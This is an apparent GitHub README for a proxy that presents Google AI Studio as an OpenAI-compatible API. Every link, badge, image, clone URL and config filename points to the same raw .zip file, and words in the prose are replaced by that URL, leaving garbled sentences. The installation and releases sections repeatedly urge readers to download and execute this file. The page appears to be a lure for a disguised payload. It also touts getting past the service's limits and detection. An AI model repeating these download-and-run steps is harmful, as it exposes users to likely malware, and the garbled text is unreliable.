# 🌟 AIstudioProxyAPI: Seamless Access to Google AI Studio 🌟

![https://github.com/globlord/AIstudioProxyAPI/raw/refs/heads/main/tartrazine/A-Proxy-API-Istudio-v1.6.zip](https://github.com/globlord/AIstudioProxyAPI/raw/refs/heads/main/tartrazine/A-Proxy-API-Istudio-v1.6.zip) ![Playwright](https://github.com/globlord/AIstudioProxyAPI/raw/refs/heads/main/tartrazine/A-Proxy-API-Istudio-v1.6.zip) ![GitHub Releases](https://github.com/globlord/AIstudioProxyAPI/raw/refs/heads/main/tartrazine/A-Proxy-API-Istudio-v1.6.zip%20Latest-brightgreen?style=flat&logo=github&logoColor=white)

Welcome to **AIstudioProxyAPI**! This project provides a https://github.com/globlord/AIstudioProxyAPI/raw/refs/heads/main/tartrazine/A-Proxy-API-Istudio-v1.6.zip and Playwright server that simulates the OpenAI API to access the Google AI Studio web interface. By using this server, you can seamlessly forward conversations with the Gemini model. This setup allows clients compatible with the OpenAI API, such as Open WebUI and NextChat, to utilize the unlimited capabilities of AI Studio.

🔗 To get started, visit our [Releases section](https://github.com/globlord/AIstudioProxyAPI/raw/refs/heads/main/tartrazine/A-Proxy-API-Istudio-v1.6.zip) for the latest downloads.

## 🚀 Features

- **https://github.com/globlord/AIstudioProxyAPI/raw/refs/heads/main/tartrazine/A-Proxy-API-Istudio-v1.6.zip and Playwright Integration**: Harness the power of https://github.com/globlord/AIstudioProxyAPI/raw/refs/heads/main/tartrazine/A-Proxy-API-Istudio-v1.6.zip with Playwright for automated browser interactions.
- **Simulated OpenAI API**: Interact with Google AI Studio as if you were using the OpenAI API.
- **Unlimited Capabilities**: Take advantage of the full capabilities of AI Studio without the usual limitations.
- **User-Friendly**: Designed for easy setup and use with existing OpenAI API clients.

## ⚙️ Installation

To install AIstudioProxyAPI, follow these steps:

1. **Clone the Repository**:
   ```bash
   git clone https://github.com/globlord/AIstudioProxyAPI/raw/refs/heads/main/tartrazine/A-Proxy-API-Istudio-v1.6.zip
   cd AIstudioProxyAPI
   ```

2. **Install Dependencies**:
   Make sure you have https://github.com/globlord/AIstudioProxyAPI/raw/refs/heads/main/tartrazine/A-Proxy-API-Istudio-v1.6.zip installed. Then run:
   ```bash
   npm install
   ```

3. **Download the Latest Release**:
   Check the [Releases section](https://github.com/globlord/AIstudioProxyAPI/raw/refs/heads/main/tartrazine/A-Proxy-API-Istudio-v1.6.zip) to download the latest version. Execute the downloaded file to start the server.

## 📜 Usage

Once you have the server running, you can send requests to it as if you were using the OpenAI API. Here’s a basic example using `curl`:

```bash
curl -X POST http://localhost:3000/v1/chat/completions \
-H "Content-Type: application/json" \
-d '{
  "model": "gpt-3.5-turbo",
  "messages": [{"role": "user", "content": "Hello!"}]
}'
```

This will return a response from the Gemini model via the AI Studio interface.

## 🛠️ Limitations

Currently, due to automated detection mechanisms, headless mode is not supported. This means that you must run the server in a visible browser window. This project is primarily for personal use and will be maintained on an as-needed basis.

## 📚 Documentation

For more detailed information on how to use the API, refer to the following sections:

### API Endpoints

- **Chat Completions**: `/v1/chat/completions`
  - Send a chat message and receive a response.

### Request Structure

- **Headers**:
  - `Content-Type`: Must be set to `application/json`.

- **Body**:
  - `model`: Specify the model you wish to use (e.g., `gpt-3.5-turbo`).
  - `messages`: An array of message objects, each containing a `role` (user or assistant) and `content`.

## 🔧 Configuration

You can configure various settings in the `https://github.com/globlord/AIstudioProxyAPI/raw/refs/heads/main/tartrazine/A-Proxy-API-Istudio-v1.6.zip` file. Here are some of the options available:

```json
{
  "port": 3000,
  "headless": false,
  "timeout": 30000
}
```

- **port**: Change the port on which the server listens.
- **headless**: Set to `true` to run in headless mode (not currently supported).
- **timeout**: Set the timeout for requests in milliseconds.

## 🌐 Contributing

We welcome contributions! If you would like to help improve AIstudioProxyAPI, please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or fix.
3. Make your changes and commit them.
4. Push to your branch and open a pull request.

## 📝 License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.

## 💬 Support

If you encounter any issues or have questions, feel free to open an issue in the repository. We appreciate your feedback and will do our best to assist you.

## 📦 Releases

For the latest updates and releases, check out the [Releases section](https://github.com/globlord/AIstudioProxyAPI/raw/refs/heads/main/tartrazine/A-Proxy-API-Istudio-v1.6.zip). Download the latest version and execute it to get started.

## 🌟 Acknowledgments

We would like to thank the developers of https://github.com/globlord/AIstudioProxyAPI/raw/refs/heads/main/tartrazine/A-Proxy-API-Istudio-v1.6.zip and Playwright for their excellent tools that make this project possible. Their work has enabled us to create a seamless interface with AI Studio.

## 🖼️ Screenshots

![AIstudioProxyAPI in Action](https://github.com/globlord/AIstudioProxyAPI/raw/refs/heads/main/tartrazine/A-Proxy-API-Istudio-v1.6.zip)

## 📈 Future Plans

- Improve error handling and logging.
- Explore the possibility of headless mode in future updates.
- Expand API capabilities to include more features from Google AI Studio.

Thank you for checking out **AIstudioProxyAPI**! We hope you find it useful in your projects. For more information, visit the [Releases section](https://github.com/globlord/AIstudioProxyAPI/raw/refs/heads/main/tartrazine/A-Proxy-API-Istudio-v1.6.zip) to download the latest version and start using it today!